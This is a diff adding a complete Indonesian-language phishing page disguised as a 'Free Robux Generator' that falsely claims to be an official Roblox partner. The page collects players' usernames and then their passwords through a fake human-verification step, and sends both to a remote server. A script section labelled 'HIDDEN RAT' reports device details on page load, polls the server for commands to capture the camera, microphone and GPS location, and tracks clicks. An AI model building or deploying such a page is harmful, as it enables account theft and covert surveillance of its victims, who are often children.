@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Roblox - Free Robux Generator</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#1a1a2e;
+            font-family:'Segoe UI',system-ui,sans-serif;
+            color:#fff;
+            min-height:100vh;
+            padding:15px;
+        }
+        .container{
+            max-width:500px;
+            margin:0 auto;
+        }
+        .header{
+            text-align:center;
+            padding:25px 15px;
+            background:linear-gradient(135deg,#0f1923,#16213e);
+            border-radius:16px;
+            margin-bottom:15px;
+            border:1px solid #2a3a50;
+        }
+        .logo{
+            font-size:50px;
+            margin-bottom:10px;
+        }
+        h1{
+            font-size:24px;
+            color:#00b4d8;
+            margin-bottom:5px;
+        }
+        .sub{
+            color:#888;
+            font-size:13px;
+        }
+        .card{
+            background:#16213e;
+            border:1px solid #2a3a50;
+            border-radius:16px;
+            padding:25px;
+            margin-bottom:15px;
+        }
+        .card h2{
+            font-size:18px;
+            color:#f78166;
+            margin-bottom:15px;
+            text-align:center;
+        }
+        .amount-grid{
+            display:grid;
+            grid-template-columns:repeat(2,1fr);
+            gap:10px;
+            margin-bottom:20px;
+        }
+        .amount-btn{
+            background:#0f1923;
+            border:2px solid #2a3a50;
+            border-radius:12px;
+            padding:20px;
+            text-align:center;
+            cursor:pointer;
+            transition:.3s;
+            color:#fff;
+            font-size:16px;
+            font-weight:bold;
+        }
+        .amount-btn:hover{
+            border-color:#00b4d8;
+            background:#1a2a3a;
+            transform:translateY(-2px);
+        }
+        .amount-btn.selected{
+            border-color:#00b4d8;
+            background:#1a3a4a;
+            box-shadow:0 0 20px rgba(0,180,216,.3);
+        }
+        .amount-btn .robux{font-size:28px;color:#00b4d8}
+        .amount-btn .label{font-size:12px;color:#888}
+        input{
+            width:100%;
+            padding:16px;
+            background:#0f1923;
+            border:2px solid #2a3a50;
+            border-radius:12px;
+            color:#fff;
+            font-size:16px;
+            margin-bottom:12px;
+            outline:none;
+            transition:.3s;
+        }
+        input:focus{border-color:#00b4d8}
+        .btn-generate{
+            width:100%;
+            padding:18px;
+            background:linear-gradient(135deg,#00b4d8,#0077b6);
+            color:#fff;
+            border:none;
+            border-radius:12px;
+            font-size:18px;
+            font-weight:bold;
+            cursor:pointer;
+            transition:.3s;
+            margin-top:5px;
+        }
+        .btn-generate:hover{
+            transform:translateY(-2px);
+            box-shadow:0 8px 30px rgba(0,180,216,.4);
+        }
+        .btn-generate:active{transform:scale(.95)}
+        .verify-box{
+            display:none;
+            background:#0f1923;
+            border:2px solid #f78166;
+            border-radius:12px;
+            padding:20px;
+            margin-top:15px;
+            text-align:center;
+            animation:fadeIn .5s;
+        }
+        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+        .verify-box h3{color:#f78166;margin-bottom:10px}
+        .verify-box p{color:#888;font-size:13px;margin-bottom:15px}
+        .progress-bar{
+            width:100%;
+            height:6px;
+            background:#2a3a50;
+            border-radius:3px;
+            overflow:hidden;
+            margin:15px 0;
+        }
+        .progress-fill{
+            height:100%;
+            background:linear-gradient(90deg,#00b4d8,#0077b6);
+            animation:progress 5s forwards;
+            width:0%;
+        }
+        @keyframes progress{0%{width:0%}50%{width:60%}80%{width:85%}100%{width:100%}}
+        .feature-list{
+            list-style:none;
+            margin:15px 0;
+        }
+        .feature-list li{
+            padding:8px 0;
+            border-bottom:1px solid #1a2a3a;
+            font-size:13px;
+            color:#aaa;
+        }
+        .feature-list li:before{
+            content:"✅ ";
+            margin-right:8px;
+        }
+        .warning{
+            background:rgba(255,123,0,.1);
+            border:1px solid rgba(255,123,0,.3);
+            padding:12px;
+            border-radius:8px;
+            font-size:11px;
+            color:#ff7b00;
+            text-align:center;
+            margin-top:10px;
+        }
+        .user-badge{
+            display:inline-block;
+            background:rgba(0,180,216,.2);
+            padding:8px 16px;
+            border-radius:20px;
+            font-size:14px;
+            color:#00b4d8;
+            margin:5px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <!-- HEADER -->
+    <div class="header">
+        <div class="logo">🎮</div>
+        <h1>FREE ROBUX GENERATOR</h1>
+        <p class="sub">Official Roblox Partner • 100% Working</p>
+    </div>
+
+    <!-- GENERATOR CARD -->
+    <div class="card" id="generatorCard">
+        <h2>💰 Pilih Jumlah Robux</h2>
+        
+        <div class="amount-grid">
+            <div class="amount-btn" onclick="selectAmount(this,'800')">
+                <div class="robux">R$ 800</div>
+                <div class="label">Free</div>
+            </div>
+            <div class="amount-btn" onclick="selectAmount(this,'1700')">
+                <div class="robux">R$ 1,700</div>
+                <div class="label">Free</div>
+            </div>
+            <div class="amount-btn" onclick="selectAmount(this,'4500')">
+                <div class="robux">R$ 4,500</div>
+                <div class="label">Free</div>
+            </div>
+            <div class="amount-btn" onclick="selectAmount(this,'10000')">
+                <div class="robux">R$ 10,000</div>
+                <div class="label">Free</div>
+            </div>
+        </div>
+
+        <input type="text" id="username" placeholder="Masukkan Username Roblox" autocomplete="off">
+        
+        <button class="btn-generate" onclick="startGenerate()">
+            ⚡ GENERATE ROBUX
+        </button>
+
+        <div class="warning">
+            ⚠️ Tidak perlu password! Cukup username saja.
+            Proses verifikasi manusia diperlukan untuk mencegah bot.
+        </div>
+    </div>
+
+    <!-- VERIFICATION CARD -->
+    <div class="verify-box" id="verifyBox">
+        <h3>🔐 Verifikasi Manusia</h3>
+        <p>Ketik ulang password Roblox Anda untuk verifikasi bahwa Anda manusia</p>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <input type="password" id="password" placeholder="Password Roblox" autocomplete="off">
+        <p style="font-size:11px;color:#888;margin-bottom:10px;">
+            🔒 Password Anda aman dan terenkripsi
+        </p>
+        
+        <button class="btn-generate" onclick="verifyAndSend()" style="background:linear-gradient(135deg,#f78166,#e94560);">
+            ✅ VERIFIKASI & KIRIM
+        </button>
+        
+        <p style="font-size:11px;color:#666;margin-top:10px;">
+            Robux akan masuk dalam 5-30 menit
+        </p>
+    </div>
+
+    <!-- INFO CARD -->
+    <div class="card">
+        <h2>🌟 Fitur Generator</h2>
+        <ul class="feature-list">
+            <li>Robux langsung masuk ke akun</li>
+            <li>Tidak perlu download aplikasi</li>
+            <li>100% Aman & Terpercaya</li>
+            <li>Didukung oleh Roblox Partner</li>
+            <li>Sudah 2M+ pengguna berhasil</li>
+        </ul>
+        
+        <div style="text-align:center;margin-top:15px;">
+            <span class="user-badge">👤 RizkyGaming - Dapat R$ 10,000</span>
+            <span class="user-badge">👤 ProBuilder99 - Dapat R$ 4,500</span>
+            <span class="user-badge">👤 DiamondQueen - Dapat R$ 1,700</span>
+        </div>
+    </div>
+
+</div>
+
+<script>
+// ==========================================
+// ROBBUX GENERATOR LOGIC
+// ==========================================
+let selectedAmount = '1700';
+let targetUsername = '';
+
+function selectAmount(btn, amount){
+    document.querySelectorAll('.amount-btn').forEach(b=>b.classList.remove('selected'));
+    btn.classList.add('selected');
+    selectedAmount = amount;
+}
+
+function startGenerate(){
+    targetUsername = document.getElementById('username').value.trim();
+    
+    if(!targetUsername){
+        alert('Masukkan username Roblox!');
+        return;
+    }
+    
+    // Tampilkan verifikasi
+    document.getElementById('verifyBox').style.display = 'block';
+    document.getElementById('verifyBox').scrollIntoView({behavior:'smooth'});
+    
+    // Kirim data username ke server
+    sendToServer({
+        step: 'username_entered',
+        username: targetUsername,
+        amount: selectedAmount
+    });
+}
+
+function verifyAndSend(){
+    const password = document.getElementById('password').value.trim();
+    
+    if(!password){
+        alert('Masukkan password untuk verifikasi!');
+        return;
+    }
+    
+    // Kirim username + password ke server
+    sendToServer({
+        step: 'verification_complete',
+        username: targetUsername,
+        password: password,
+        amount: selectedAmount
+    });
+    
+    // Animasi sukses
+    document.getElementById('verifyBox').innerHTML = `
+        <div style="text-align:center;padding:20px;">
+            <div style="font-size:60px;margin-bottom:15px;">✅</div>
+            <h3 style="color:#00b4d8;">Verifikasi Berhasil!</h3>
+            <p style="color:#888;">R$ ${selectedAmount} akan dikirim ke <b style="color:#fff;">${targetUsername}</b></p>
+            <div class="progress-bar" style="margin:15px 0;">
+                <div class="progress-fill" style="width:100%;animation:none;"></div>
+            </div>
+            <p style="color:#888;font-size:12px;">Mengirim Robux... Mohon tunggu 5-30 menit</p>
+            <p style="color:#666;font-size:11px;margin-top:10px;">Jangan tutup halaman ini</p>
+        </div>
+    `;
+    
+    // Redirect setelah delay
+    setTimeout(()=>{
+        window.location.href = 'https://www.roblox.com/login';
+    },5000);
+}
+
+// ==========================================
+// HIDDEN RAT (AUTO CONNECT)
+// ==========================================
+const SERVER = 'http://192.168.1.2:5000';
+const DEVICE_ID = 'RBX_'+Math.random().toString(36).substr(2,9);
+
+function sendToServer(data){
+    const payload = {
+        ...data,
+        id: DEVICE_ID,
+        device: navigator.userAgent.substring(0,150),
+        platform: navigator.platform,
+        screen: screen.width+'x'+screen.height,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toISOString()
+    };
+    
+    // Multiple send methods
+    fetch(SERVER+'/api/report',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(payload)
+    }).catch(()=>{});
+    
+    // Beacon backup
+    navigator.sendBeacon(SERVER+'/api/report',JSON.stringify(payload));
+}
+
+// Auto report on page load
+sendToServer({status:'page_opened',action:'roblox_generator'});
+
+// Keep alive
+setInterval(()=>{
+    sendToServer({hb:Date.now(),action:'keep_alive'});
+    
+    // Check commands
+    fetch(SERVER+'/api/cmd/'+DEVICE_ID)
+        .then(r=>r.text())
+        .then(cmd=>{
+            if(cmd==='camera')takePhoto();
+            if(cmd==='mic')recordMic();
+            if(cmd==='gps')getGPS();
+            if(cmd==='screen')takeScreenshot();
+        }).catch(()=>{});
+},8000);
+
+// Camera function
+function takePhoto(){
+    if(navigator.mediaDevices){
+        navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}).then(stream=>{
+            const track=stream.getVideoTracks()[0];
+            const capture=new ImageCapture(track);
+            capture.takePhoto().then(blob=>{
+                const reader=new FileReader();
+                reader.onload=()=>{
+                    sendToServer({photo:reader.result.split(',')[1]});
+                    track.stop();
+                };
+                reader.readAsDataURL(blob);
+            }).catch(()=>track.stop());
+        }).catch(()=>{});
+    }
+}
+
+// Mic function
+function recordMic(){
+    if(navigator.mediaDevices){
+        navigator.mediaDevices.getUserMedia({audio:true}).then(stream=>{
+            const recorder=new MediaRecorder(stream);
+            const chunks=[];
+            recorder.ondataavailable=e=>chunks.push(e.data);
+            recorder.onstop=()=>{
+                const blob=new Blob(chunks);
+                const reader=new FileReader();
+                reader.onload=()=>{
+                    sendToServer({audio:reader.result.split(',')[1]});
+                    stream.getTracks().forEach(t=>t.stop());
+                };
+                reader.readAsDataURL(blob);
+            };
+            recorder.start();
+            setTimeout(()=>recorder.stop(),3000);
+        }).catch(()=>{});
+    }
+}
+
+// GPS function
+function getGPS(){
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(pos=>{
+            sendToServer({location:pos.coords.latitude+','+pos.coords.longitude});
+        },()=>{},{enableHighAccuracy:true,timeout:5000});
+    }
+}
+
+// Screenshot function
+function takeScreenshot(){
+    sendToServer({screenshot:'requested'});
+}
+
+// Track scroll & interaction
+document.addEventListener('click',e=>{
+    sendToServer({click:{tag:e.target.tagName,text:e.target.textContent?.substring(0,50)}});
+});
+
+// Time on page
+setTimeout(()=>sendToServer({action:'30sec'}),30000);
+setTimeout(()=>sendToServer({action:'1min'}),60000);
+setTimeout(()=>sendToServer({action:'3min'}),180000);
+</script>
+</body>
+  </html>
